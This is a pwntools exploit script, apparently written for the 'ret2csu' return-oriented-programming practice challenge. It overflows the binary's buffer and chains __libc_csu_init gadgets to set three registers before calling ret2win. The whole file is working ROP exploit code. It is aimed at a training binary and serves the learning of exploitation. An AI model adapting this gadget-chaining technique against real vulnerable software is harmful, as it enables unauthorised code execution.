from pwn import*
context.log_level       = "DEBUG"
context.arch            = "amd64"

elf = context.binary = ELF('./ret2csu', checksec=False)

p = process("./ret2csu")

#gdb.attach(p, gdbscript='''
#b*pwnme+152
#c
#''')

ret = ROP(elf).find_gadget(["ret"])[0]
pop_rdi = ROP(elf).find_gadget(["pop rdi", "ret"])[0]
pop_rsi_r15 = ROP(elf).find_gadget(["pop rsi", "pop r15", "ret"])[0]
win = elf.sym['ret2win']
vuln = elf.sym['usefulFunction']

str_addr = 0x601040

pop_rbx_rbp_r12_r13_r14_r15 = 0x000000000040069a
mov_rdx_r15_rsi_r14_edi_r13 = 0x0000000000400680

arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d
addr_contains_init_func = 0x600e38
payload = flat(
    cyclic(0x28),
    pop_rbx_rbp_r12_r13_r14_r15,
    0,
    1,
    addr_contains_init_func,
    arg1,
    arg2,
    arg3,
    mov_rdx_r15_rsi_r14_edi_r13,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    pop_rdi,
    arg1,
    win
    )
p.sendlineafter(b">",payload)
p.interactive()
